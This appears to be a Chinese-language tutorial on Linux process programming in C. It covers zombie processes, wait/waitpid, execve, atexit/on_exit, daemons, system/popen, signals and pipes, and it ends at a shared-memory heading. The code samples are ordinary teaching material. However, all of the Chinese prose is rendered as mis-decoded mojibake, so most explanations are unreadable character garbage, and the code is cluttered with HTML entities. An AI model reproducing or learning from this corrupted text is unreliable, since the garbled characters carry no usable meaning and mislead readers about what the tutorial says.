è§£å†³åƒµå°¸è¿›ç¨‹çš„æ–¹æ³•æ˜¯å¹²æ‰åƒµå°¸è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼Œåƒµå°¸è¿›ç¨‹ä¹Ÿå°±å˜æˆäº†å­¤å„¿è¿›ç¨‹ï¼Œæœ€ç»ˆè¢«initè¿›ç¨‹æ¥ç®¡ï¼Œinitè¿›ç¨‹ä¼šè´Ÿè´£waitè¿™äº›å­¤å„¿è¿›ç¨‹ï¼Œé‡Šæ”¾å ç”¨çš„èµ„æºã€‚ waitå’Œwaitpidå‡½æ•°pid_t wait(int status);ï¼šç­‰å¾…ä»»æ„å­è¿›ç¨‹é€€å‡ºï¼Œå¹¶æ•è·é€€å‡ºçŠ¶æ€pid_t waitpid(pid_t pid, int status, int options);ï¼šç­‰å¾…å­è¿›ç¨‹é€€å‡ºï¼Œå¹¶æ•è·é€€å‡ºçŠ¶æ€è¿™ä¸¤ä¸ªå‡½æ•°è¿”å›çš„éƒ½æ˜¯é€€å‡ºçš„å­è¿›ç¨‹çš„id #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;wait.h&gt; int main(int argc, char const *argv[],char *envp[]) { pid_t fpid = fork(), pid; if(fpid &lt; 0) { perror(&quot;fork error&quot;); exit(EXIT_FAILURE); } else if(fpid ==0 ) { sleep(5); exit(5); } else { int stat; for(;;){ pid = waitpid(fpid,&amp;stat,WNOHANG); //statç”¨äºè®°å½•å­è¿›ç¨‹çš„è¿”å›ç»“æœ if(pid&gt;0) { break; }else { printf(&quot;wait child proc ... \\n&quot;); sleep(1); } } if(WIFEXITED(stat))//è¿™ä¸ªå‡½æ•°å¦‚æœå­è¿›ç¨‹æ­£å¸¸é€€å‡ºçš„è¯å°±è¿”å›çœŸ { printf(&quot;child_proc(%d): exit_code :%d\\n&quot;,pid,WEXITSTATUS(stat)); } } return 0; } å¤„ç†å­è¿›ç¨‹çš„é€€å‡ºæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼šç¬¬ä¸€ç§ï¼šé€šè¿‡ä¿¡å·å¤„ç†å‡½æ•°signal()ï¼Œå¦‚å¯ä»¥å¿½ç•¥å­è¿›ç¨‹çš„SIGCHLDä¿¡å·æ¥é˜²æ­¢åƒµå°¸è¿›ç¨‹çš„äº§ç”Ÿï¼šsignal(SIGCHLD, SIG_IGN);ç¬¬äºŒç§ï¼šé€šè¿‡è°ƒç”¨wait()ã€waitpid()å‡½æ•°ï¼Œæ¥å›æ”¶å­è¿›ç¨‹ï¼Œé˜²æ­¢äº§ç”Ÿåƒµå°¸è¿›ç¨‹ï¼Œå ç”¨PIDç­‰å®è´µçš„ç³»ç»Ÿèµ„æºï¼› ç»å¸¸åœ¨parent processä¸­çœ‹åˆ°wait(NULL)çš„æ“ä½œï¼Œæ„æ€å°±æ˜¯è®©çˆ¶è¿›ç¨‹ç­‰child process è¿”å›exit statusã€‚wait(NULL)æ˜¯ä»€ä¹ˆæ„æ€ wait(NULL) will block parent process until any of its children has finished. If child terminates before parent process reaches wait(NULL) then the child process turns to a zombie process until its parent waits on it and its released from memory. If parent process doesn&#39;t wait for its child, and parent finishes first, then the child process becomes orphan and is assigned to init as its child. And init will wait and release the process entry in the process table. In other words: parent process will be blocked until child process returns an exit status to the operating system which is then returned to parent process. If child finishes before parent reaches wait(NULL) then it will read the exit status, release the process entry in the process table and continue execution until it finishes as well. execç³»åˆ—å‡½æ•°forkå‡ºæ¥ä¸€ä¸ªæ–°çš„è¿›ç¨‹å½“ç„¶æ˜¯è¦å¹²æ´»çš„ï¼Œå°±è¦ç”¨åˆ°execç³»ç»Ÿè°ƒç”¨execç³»ç»Ÿè°ƒç”¨æ˜¯ä»¥æ–°çš„è¿›ç¨‹ç©ºé—´æ›¿æ¢ç°åœ¨çš„è¿›ç¨‹ç©ºé—´ï¼Œä½†æ˜¯pidä¸å˜ï¼Œè¿˜æ˜¯åŸæ¥çš„pidï¼Œç›¸å½“äºæ¢äº†ä¸ªèº«ä½“ï¼Œä½†æ˜¯åå­—ä¸å˜ï¼›è°ƒç”¨execåï¼Œç³»ç»Ÿä¼šç”³è¯·ä¸€å—æ–°çš„è¿›ç¨‹ç©ºé—´æ¥å­˜æ”¾è¢«è°ƒç”¨çš„ç¨‹åºï¼Œç„¶åå½“å‰è¿›ç¨‹ä¼šæºå¸¦pidè·³è½¬åˆ°æ–°çš„è¿›ç¨‹ç©ºé—´ï¼Œå¹¶ä»mainå‡½æ•°å¼€å§‹æ‰§è¡Œï¼Œæ—§çš„è¿›ç¨‹ç©ºé—´è¢«å›æ”¶ï¼›execç”¨è¢«æ‰§è¡Œçš„ç¨‹åºå®Œå…¨æ›¿æ¢è°ƒç”¨å®ƒçš„ç¨‹åºçš„å½±åƒã€‚forkåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹å°±äº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„PIDï¼Œexecå¯åŠ¨ä¸€ä¸ªæ–°ç¨‹åºï¼Œæ›¿æ¢åŸæœ‰çš„è¿›ç¨‹ï¼Œå› æ­¤è¿™ä¸ªæ–°çš„è¢«execæ‰§è¡Œçš„è¿›ç¨‹çš„PIDä¸ä¼šæ”¹å˜ï¼Œ #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main(int arg,char **args) { char *argv[]={&quot;ls&quot;,&quot;-al&quot;,&quot;/usr/include/linux&quot;,NULL};//ä¼ é€’ç»™æ‰§è¡Œæ–‡ä»¶çš„å‚æ•°æ•°ç»„ï¼Œè¿™é‡ŒåŒ…å«æ‰§è¡Œæ–‡ä»¶çš„å‚æ•° char *envp[]={0,NULL};//ä¼ é€’ç»™æ‰§è¡Œæ–‡ä»¶æ–°çš„ç¯å¢ƒå˜é‡æ•°ç»„ execve(&quot;/bin/ls&quot;,argv,envp); } è¿™ä¸ªå‡½æ•°çš„å‚æ•° int execve( char *pathname,char *argv[],char *envp[]) exit(å¯ä»¥æ³¨å†Œè¿›ç¨‹é€€å‡ºçš„æ—¶å€™çš„å›è°ƒå‡½æ•°)exitæ˜¯ç³»ç»Ÿè°ƒç”¨çº§åˆ«çš„ï¼Œç”¨äºè¿›ç¨‹è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œéšæ—¶ç»“æŸè¿›ç¨‹ï¼›returnæ˜¯è¯­è¨€çº§åˆ«çš„ï¼Œç”¨äºè°ƒç”¨å †æ ˆçš„è¿”å›ï¼Œè¿”å›ä¸Šä¸€å±‚è°ƒç”¨ï¼›åœ¨mainå‡½æ•°ä¸­è°ƒç”¨exit(0)ç­‰ä»·äºreturn 0ï¼›_exit()å‡½æ•°çš„ä½œç”¨æœ€ä¸ºç®€å•ï¼šç›´æ¥ä½¿è¿›ç¨‹åœæ­¢è¿è¡Œï¼Œæ¸…é™¤å…¶ä½¿ç”¨çš„å†…å­˜ç©ºé—´ï¼Œå¹¶é”€æ¯å…¶åœ¨å†…æ ¸ä¸­çš„å„ç§æ•°æ®ç»“æ„ï¼›exit()å‡½æ•°åˆ™åœ¨è¿™äº›åŸºç¡€ä¸Šä½œäº†ä¸€äº›åŒ…è£…ï¼Œåœ¨æ‰§è¡Œé€€å‡ºä¹‹å‰åŠ äº†è‹¥å¹²é“å·¥åºï¼›exit()å‡½æ•°ä¸_exit()å‡½æ•°æœ€å¤§çš„åŒºåˆ«å°±åœ¨äºexit()è¦æ£€æŸ¥æ–‡ä»¶çš„æ‰“å¼€æƒ…å†µï¼ŒæŠŠæ–‡ä»¶ç¼“å†²åŒºä¸­çš„å†…å®¹å†™å›æ–‡ä»¶ï¼Œå°±æ˜¯â€æ¸…ç†I/Oç¼“å†²â€ï¼› æŒ‰ç…§ANSI Cçš„è§„å®šï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç™»è®°è‡³å¤š32ä¸ªå‡½æ•°ï¼Œè¿™äº›å‡½æ•°å°†ç”±exitè‡ªåŠ¨è°ƒç”¨ï¼›ï¼ˆä¹Ÿå°±æ˜¯è¯´åœ¨è°ƒç”¨exitçš„æ—¶å€™ä¼šè°ƒç”¨è¿™äº›å›è°ƒå‡½æ•°ï¼‰åˆ†ä¸ºatexitå’Œon_exit #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;signal.h&gt; void func1(void){ printf(&quot;&lt;atexit&gt; func1 getpid = %d \\n&quot;,getpid()); } void func2(void){ printf(&quot;&lt;atexit&gt; func2 getpid = %d \\n&quot;,getpid()); } void func3(void){ printf(&quot;&lt;atexit&gt; func3 getpid = %d \\n&quot;,getpid()); } void func(int status, void *str){ printf(&quot;&lt;on_exit&gt; exit_code: %d, arg: %s getpid = %d \\n&quot;, status, (char *)str,getpid()); } int main(void){ signal(SIGCHLD, SIG_IGN); on_exit(func, &quot;on_exit3&quot;); on_exit(func, &quot;on_exit2&quot;); on_exit(func, &quot;on_exit1&quot;); atexit(func3); atexit(func2); atexit(func1); pid_t pid; pid = fork(); if(pid &lt; 0){ perror(&quot;fork error&quot;); exit(EXIT_FAILURE); }else if(pid == 0){ exit(0); }else{ sleep(3); } return 0; } è¾“å‡ºï¼š &lt;atexit&gt; func1 getpid = 13508 &lt;atexit&gt; func2 getpid = 13508 &lt;atexit&gt; func3 getpid = 13508 &lt;on_exit&gt; exit_code: 0, arg: on_exit1 getpid = 13508 &lt;on_exit&gt; exit_code: 0, arg: on_exit2 getpid = 13508 &lt;on_exit&gt; exit_code: 0, arg: on_exit3 getpid = 13508 &lt;atexit&gt; func1 getpid = 13507 &lt;atexit&gt; func2 getpid = 13507 &lt;atexit&gt; func3 getpid = 13507 &lt;on_exit&gt; exit_code: 0, arg: on_exit1 getpid = 13507 &lt;on_exit&gt; exit_code: 0, arg: on_exit2 getpid = 13507 ä¹Ÿå°±æ˜¯è¯´forkå‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„ç»ˆæ­¢å¤„ç†å‡½æ•°ã€ä¿¡å·å¤„ç†è®¾ç½®ï¼› Daemonå®ˆæŠ¤è¿›ç¨‹Linux Daemonè¿›ç¨‹æ˜¯è¿è¡Œåœ¨åå°çš„ä¸€ç§ç‰¹æ®Šè¿›ç¨‹ã€‚ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ˜¯initè¿›ç¨‹ï¼Œå› ä¸ºå®ƒçœŸæ­£çš„çˆ¶è¿›ç¨‹åœ¨forkå‡ºå­è¿›ç¨‹åå°±å…ˆäºå­è¿›ç¨‹exité€€å‡ºäº†ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªç”±initç»§æ‰¿çš„å­¤å„¿è¿›ç¨‹ï¼›å®ˆæŠ¤è¿›ç¨‹æ˜¯éäº¤äº’å¼ç¨‹åºï¼Œæ²¡æœ‰æ§åˆ¶ç»ˆç«¯ï¼Œæ‰€ä»¥ä»»ä½•è¾“å‡ºï¼Œæ— è®ºæ˜¯å‘æ ‡å‡†è¾“å‡ºè®¾å¤‡stdoutè¿˜æ˜¯æ ‡å‡†å‡ºé”™è®¾å¤‡stderrçš„è¾“å‡ºéƒ½éœ€è¦ç‰¹æ®Šå¤„ç†ï¼›å®ˆæŠ¤è¿›ç¨‹çš„åç§°é€šå¸¸ä»¥dç»“å°¾ï¼Œæ¯”å¦‚sshdã€xinetdã€crondç­‰ï¼› å¤´æ–‡ä»¶ï¼šunistd.hint daemon(int nochdir, int noclose); systemå’Œpopensystemæ˜¯å»æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤system()å‡½æ•°è°ƒç”¨/bin/shæ¥æ‰§è¡Œå‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼Œ/bin/shä¸€èˆ¬æ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼ŒæŒ‡å‘æŸä¸ªå…·ä½“çš„shellï¼Œæ¯”å¦‚bashï¼› system(&quot;cat /etc/sysctl.conf&quot;);ï¼› å®é™…ä¸Šsystem()å‡½æ•°æ‰§è¡Œäº†ä¸‰æ­¥æ“ä½œï¼šforkä¸€ä¸ªå­è¿›ç¨‹ï¼›åœ¨å­è¿›ç¨‹ä¸­è°ƒç”¨execå‡½æ•°å»æ‰§è¡Œcommandï¼›åœ¨çˆ¶è¿›ç¨‹ä¸­è°ƒç”¨waitå»ç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼›ä¸€ä¸ªä¸å¥½çš„åœ°æ–¹æ˜¯system()ï¼Œå¹¶ä¸èƒ½è·å–å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºç»“æœï¼Œåªèƒ½å¾—åˆ°æ‰§è¡Œçš„è¿”å›å€¼ï¼› popenæ ‡å‡†I/Oå‡½æ•°åº“æä¾›äº†popenå‡½æ•°ï¼Œå®ƒå¯åŠ¨å¦å¤–ä¸€ä¸ªè¿›ç¨‹å»æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤è¡Œï¼›è¿™é‡Œæˆ‘ä»¬ç§°è°ƒç”¨popençš„è¿›ç¨‹ä¸ºçˆ¶è¿›ç¨‹ï¼Œç”±popenå¯åŠ¨çš„è¿›ç¨‹ç§°ä¸ºå­è¿›ç¨‹ï¼› popenå‡½æ•°è¿˜åˆ›å»ºä¸€ä¸ªç®¡é“ç”¨äºçˆ¶å­è¿›ç¨‹é—´é€šä¿¡ï¼›çˆ¶è¿›ç¨‹è¦ä¹ˆä»ç®¡é“è¯»ä¿¡æ¯ï¼Œè¦ä¹ˆå‘ç®¡é“å†™ä¿¡æ¯ï¼Œè‡³äºæ˜¯è¯»è¿˜æ˜¯å†™å–å†³äºçˆ¶è¿›ç¨‹è°ƒç”¨popenæ—¶ä¼ é€’çš„å‚æ•°ï¼› #include &lt;stdio.h&gt; FILE *popen(const char *command, const char *type); /* å‡½æ•°åŠŸèƒ½ï¼špopen()ä¼šè°ƒç”¨fork()äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åä»å­è¿›ç¨‹ä¸­è°ƒç”¨/bin/sh -cæ¥æ‰§è¡Œå‚æ•°commandçš„æŒ‡ä»¤; å‚æ•°typeå¯ä½¿ç”¨&quot;r&quot;ä»£è¡¨è¯»å–ï¼Œ&quot;w&quot;ä»£è¡¨å†™å…¥; ä¾ç…§æ­¤typeå€¼ï¼Œpopen()ä¼šå»ºç«‹ç®¡é“è¿åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ; éšåè¿›ç¨‹ä¾¿å¯åˆ©ç”¨æ­¤æ–‡ä»¶æŒ‡é’ˆæ¥è¯»å–å­è¿›ç¨‹çš„è¾“å‡ºè®¾å¤‡æˆ–æ˜¯å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­; è¿”å›å€¼ï¼šè‹¥æˆåŠŸåˆ™è¿”å›æ–‡ä»¶æŒ‡é’ˆï¼Œå¦åˆ™è¿”å›NULLï¼Œé”™è¯¯åŸå› å­˜äºerrnoä¸­ */ int pclose(FILE *stream); /* å‡½æ•°åŠŸèƒ½ï¼špclose()ç”¨æ¥å…³é—­ç”±popenæ‰€å»ºç«‹çš„ç®¡é“åŠæ–‡ä»¶æŒ‡é’ˆï¼›å‚æ•°streamä¸ºå…ˆå‰ç”±popen()æ‰€è¿”å›çš„æ–‡ä»¶æŒ‡é’ˆ; è¿”å›å€¼ï¼šè‹¥æˆåŠŸåˆ™è¿”å›shellçš„ç»ˆæ­¢çŠ¶æ€(ä¹Ÿå³å­è¿›ç¨‹çš„ç»ˆæ­¢çŠ¶æ€)ï¼Œè‹¥å‡ºé”™è¿”å›-1ï¼Œé”™è¯¯åŸå› å­˜äºerrnoä¸­; */ è¿™é‡Œæ­£å¼ä½¿ç”¨åˆ°äº†è¿›ç¨‹ä¹‹é—´çš„ç®¡é“é€šä¿¡ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 2){ fprintf(stderr, &quot;usage: %s &lt;cmd&gt;\\n&quot;, argv[0]); exit(EXIT_FAILURE); } char output[1024+1]; FILE *pp = popen(argv[1], &quot;r&quot;); if(pp == NULL){ perror(&quot;popen error&quot;); exit(EXIT_FAILURE); } int nread = fread(output, 1, 1024, pp); //çˆ¶è¿›ç¨‹é€šè¿‡æ–‡ä»¶æŒ‡é’ˆè¯»å–å­è¿›ç¨‹çš„è¾“å‡ºè®¾å¤‡ã€‚ int status = pclose(pp); if(status &lt; 0){ perror(&quot;pclose error&quot;); exit(EXIT_FAILURE); } output[nread] = &#39;\\0&#39;; if(WIFEXITED(status)){ printf(&quot;status: %d\\n%s&quot;, WEXITSTATUS(status), output); } return 0; } signalä¿¡å·ä¿¡å·(signal)æ˜¯ä¸€ç§è½¯ä¸­æ–­ï¼Œä¿¡å·æœºåˆ¶æ˜¯è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æ–¹å¼ï¼Œé‡‡ç”¨å¼‚æ­¥é€šä¿¡æ–¹å¼ç”¨kill -l å¯ä»¥æŸ¥çœ‹å¯ä»¥å‘å‡ºçš„ä¿¡å· $ kill -l HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM 16 CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL 30 SYS æŒ‘å‡ ä¸ªé‡è¦çš„:SIGINT(2) ä¸­æ–­ ï¼ˆCTRL + Cï¼‰SIGKILL(9) killä¿¡å·ï¼ˆå¼ºæ€ï¼Œè¿›ç¨‹ä¸èƒ½é˜»æ­¢ï¼‰SIGPIPE(13) ç®¡é“ç ´æŸï¼Œæ²¡æœ‰è¯»ç«¯çš„ç®¡é“å†™æ•°æ®,å°±æ˜¯é‚£ä¸ªbrokenpipeã€‚é»˜è®¤æ˜¯æ€è¿›ç¨‹çš„ï¼Œæ‰€ä»¥ç½‘ç»œç¼–ç¨‹ä¸­è¦å¤„ç†è¿™ä¸ªä¿¡å·ã€‚ï¼ˆå½“æœåŠ¡å™¨closeä¸€ä¸ªè¿æ¥æ—¶ï¼Œè‹¥clientç«¯æ¥ç€å‘æ•°æ®ã€‚æ ¹æ®TCPåè®®çš„è§„å®šï¼Œä¼šæ”¶åˆ°ä¸€ä¸ªRSTå“åº”ï¼Œclientå†å¾€è¿™ä¸ªæœåŠ¡å™¨å‘é€æ•°æ®æ—¶ï¼Œç³»ç»Ÿä¼šå‘å‡ºä¸€ä¸ªSIGPIPEä¿¡å·ç»™è¿›ç¨‹ï¼Œå‘Šè¯‰è¿›ç¨‹è¿™ä¸ªè¿æ¥å·²ç»æ–­å¼€äº†ï¼Œä¸è¦å†å†™äº†ã€‚ï¼‰SIGTERMï¼ˆï¼‘ï¼•ï¼‰ ç»ˆæ­¢ä¿¡å·ï¼Œè¿™ä¸ªä¸æ˜¯å¼ºåˆ¶çš„ï¼Œå®ƒå¯ä»¥è¢«æ•è·å’Œè§£é‡Šï¼ˆæˆ–å¿½ç•¥ï¼‰çš„è¿‡ç¨‹ã€‚ç±»ä¼¼äºå’Œè¿™ä¸ªè¿›ç¨‹å•†é‡ä¸€ä¸‹ï¼Œè®©å®ƒé€€å‡ºã€‚ä¸å¬è¯çš„è¯å¯ä»¥ç”¨ï¼™æ€æ‰ã€‚SIGCHLD(ï¼‘ï¼—) å­è¿›ç¨‹é€€å‡ºã€‚ é»˜è®¤å¿½ç•¥SIGSTOPï¼ˆï¼‘ï¼™ï¼‰ è¿›ç¨‹åœæ­¢ ä¸èƒ½è¢«å¿½ç•¥ã€å¤„ç†å’Œé˜»å¡SIGPWR(30) å…³æœº é»˜è®¤å¿½ç•¥è¿›ç¨‹å¯ä»¥æ³¨å†Œæ”¶åˆ°ä¿¡å·æ—¶çš„å¤„ç†å‡½æ•° #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; void handle_signal(int signum){ printf(&quot;received signal: %d\\n&quot;, signum); exit(0); } int main(void){ signal(SIGINT, handle_signal); for(;;){ printf(&quot;running ... \\n&quot;); sleep(1); } return 0; } è¿™é‡Œæ·»ä¸€å¥ï¼Œcpythonå› ä¸ºæ˜¯ç”¨ï¼£è¯­è¨€å†™çš„ï¼Œåœ¨å¤„ç†ä¿¡å·è¿™æ–¹é¢å‡ ä¹æ˜¯ä¸€æ¨¡ä¸€æ ·ã€‚æ³¨å†Œsignal_handler ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ä»‹ç»è¿›ç¨‹çš„åŸºç¡€çŸ¥è¯†åˆ°æ­¤ç»“æŸ è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä½¿ç”¨ç®¡é“ç®¡é“æ˜¯FIFOçš„ä¸‹é¢æ˜¯åˆ›å»ºä¸€ä¸ªåŒ¿åç®¡é“çš„ä»£ç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 3){ fprintf(stderr, &quot;usage: %s parent_sendmsg child_sendmsg\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int pipes[2]; if(pipe(pipes) &lt; 0){ perror(&quot;pipe&quot;); exit(EXIT_FAILURE); } pid_t pid = fork(); if(pid &lt; 0){ perror(&quot;fork&quot;); exit(EXIT_FAILURE); }else if(pid &gt; 0){ char buf[BUFSIZ + 1]; int nbuf; strcpy(buf, argv[1]); write(pipes[1], buf, strlen(buf)); sleep(1); //è¿™é‡Œsleepæ˜¯ä¸ºäº†è®©å­è¿›ç¨‹æœ‰æ—¶é—´æŠŠç®¡é“ä¸­çš„æ•°æ®è¯»èµ°ï¼Œä¸ç„¶æ•°æ®å°±ä¼šè¢«åº•ä¸‹çš„çˆ¶è¿›ç¨‹çš„readè¯»èµ°. //å› ä¸ºå®è´¨ä¸Šå†…æ ¸ä¸­åªæœ‰ä¸€ä¸ªç®¡é“ç¼“å†²åŒºï¼Œæ˜¯çˆ¶è¿›ç¨‹åˆ›å»ºçš„ï¼Œåªä¸è¿‡å­è¿›ç¨‹åŒæ—¶æ‹¥æœ‰äº†å®ƒçš„å¼•ç”¨ nbuf = read(pipes[0], buf, BUFSIZ); buf[nbuf] = 0; printf(&quot;parent_proc(%d) recv_from_child: %s\\n&quot;, getpid(), buf); close(pipes[0]); close(pipes[1]); }else if(pid == 0){ char buf[BUFSIZ + 1]; int nbuf = read(pipes[0], buf, BUFSIZ); buf[nbuf] = 0; printf(&quot;child_proc(%d) recv_from_parent: %s\\n&quot;, getpid(), buf); strcpy(buf, argv[2]); write(pipes[1], buf, strlen(buf)); close(pipes[0]); close(pipes[1]); } return 0; } ./a.out parent_say_tochild child_say_to_parent å®é™…ä¸­ä¸ºäº†å®ç°åŒå‘é€šä¿¡ï¼Œåº”è¯¥å‡†å¤‡ä¸¤æ ¹ç®¡é“ï¼Œä¸€æ ¹è´Ÿè´£ä»çˆ¶è¿›ç¨‹å¾€å­è¿›ç¨‹å†™æ•°æ®ï¼ˆåŒæ—¶å­è¿›ç¨‹ä»è¿™é‡Œè¯»å–æ•°æ®ï¼‰ï¼Œä¸€æ ¹è´Ÿè´£ä»å­è¿›ç¨‹å¾€çˆ¶è¿›ç¨‹å†™æ•°æ®ï¼ˆçˆ¶è¿›ç¨‹ä¹Ÿä»è¿™é‡Œè¯»æ•°æ®ï¼‰ ç®¡é“é»˜è®¤æ˜¯é˜»å¡æ¨¡å¼çš„ï¼Œfcntl(fd, F_SETFL, flags | O_NONBLOCK);å¯ä»¥è®¾ç½®éé˜»å¡çš„ç®¡é“ï¼Œè¿™ä¸ªè·Ÿsocketå¾ˆåƒã€‚ å‘½åç®¡é“ä¸Šé¢è¯´çš„åŒ¿åç®¡é“è¦æ±‚è¿™äº›è¿›ç¨‹éƒ½æ˜¯ç”±åŒä¸€ä¸ªç¥–å…ˆåˆ›å»ºçš„ã€‚æ‰€ä»¥åœ¨ä¸ç›¸å¹²çš„è¿›ç¨‹ä¹‹é—´äº¤æ¢æ•°æ®å°±ä¸æ–¹ä¾¿äº†ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å‘½åç®¡é“å‘½åç®¡é“ä¹Ÿè¢«ç§°ä¸ºFIFOæ–‡ä»¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªå‡½æ•°ä¹‹ä¸€æ¥åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼ŒåŸå‹å¦‚ä¸‹ï¼š å¤´æ–‡ä»¶ï¼šsys/types.hã€sys/stat.h int mkfifo(const char *filename, mode_t mode); int mknod(const char *filename, mode_t mode | S_IFIFO, (dev_t)0); è¿”å›å€¼ï¼šæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼Œå¹¶è®¾ç½®errno æ³¨æ„è¿™æ ·çš„æ–¹å¼æ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºäº†ä¸€ä¸ªçœŸå®çš„æ–‡ä»¶, å¯ä»¥å¯¹å…¶è¿›è¡Œè¯»å†™æ“ä½œ(æ³¨æ„ä¸èƒ½åŒæ—¶è¯»å†™)sender.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;errno.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 3){ fprintf(stderr, &quot;usage: %s fifo_file filename\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int fifo = open(argv[1], O_WRONLY); if(fifo &lt; 0){ perror(&quot;open&quot;); exit(EXIT_FAILURE); } FILE *fp = fopen(argv[2], &quot;rb&quot;); if(fp == NULL){ perror(&quot;fopen&quot;); exit(EXIT_FAILURE); } char buf[BUFSIZ]; int nbuf; while((nbuf = fread(buf, 1, BUFSIZ, fp)) &gt; 0){ write(fifo, buf, nbuf); } fclose(fp); close(fifo); return 0; } receiver.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;errno.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 3){ fprintf(stderr, &quot;usage: %s fifo_file filename\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int fifo = open(argv[1], O_RDONLY); if(fifo &lt; 0){ perror(&quot;fifo&quot;); exit(EXIT_FAILURE); } FILE *fp = fopen(argv[2], &quot;wb&quot;); if(fp == NULL){ perror(&quot;fopen&quot;); exit(EXIT_FAILURE); } char buf[BUFSIZ]; int nbuf; while((nbuf = read(fifo, buf, BUFSIZ)) &gt; 0){ printf(&quot;i got something %s\\n&quot;, buf); fwrite(buf, nbuf, 1, fp); } close(fifo); fclose(fp); return 0; } mkfifo fifo ##ä½¿ç”¨mkfifoè¿™ä¸ªå‘½ä»¤åˆ›å»ºä¸€ä¸ªç®¡é“æ–‡ä»¶ ./bin/sender fifo /var/log/syslog ###æŠŠ/var/log/syslogè¿™ä¸ªæ–‡ä»¶é‡Œé¢çš„å†…å®¹è¯»å‡ºæ¥ï¼Œé€šè¿‡fifoè¿™ä¸ªæ–‡ä»¶ä¼ åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ã€‚æ³¨æ„åˆ°è¿™é‡Œå¡åœ¨è¿™é‡Œäº† ./bin/receiver fifo syslog.copy ##ä»ç®¡é“æ–‡ä»¶ä¸­è¯»å–è¾“å‡ºï¼Œå†™åˆ°syslog.copyæ–‡ä»¶ä¸­.æ³¨æ„åˆ°è¿™é‡Œè¯»å®Œäº†ä¹‹åå‰é¢å¡ä½çš„è¿›ç¨‹æˆåŠŸé€€å‡ºäº† è¿™é‡Œè¿˜è¦æåˆ°å‘½åç®¡é“çš„å®‰å…¨é—®é¢˜ï¼Œæœ‰å¯èƒ½å­˜åœ¨å¤šä¸ªè¿›ç¨‹åŒæ—¶å¾€ä¸€ä¸ªFIFOæ–‡ä»¶å†™æ•°æ®ï¼Œè¿™æ ·ä¼šå­˜åœ¨æ•°æ®é¡ºåºé”™ä¹±çš„é—®é¢˜ã€‚è§£å†³æ–¹æ¡ˆå°±æ˜¯æ¯æ¬¡å†™å…¥çš„æ•°æ®çš„å¤§å°ä¿æŒåœ¨PIPE_BUFå¤§å°ä»¥å†…ï¼Œè¦ä¹ˆå…¨éƒ¨å†™å…¥ï¼Œè¦ä¹ˆä¸€ä¸ªå­—èŠ‚ä¹Ÿä¸å†™å…¥ã€‚ å…±äº«å†…å­˜æ¦‚å¿µ: 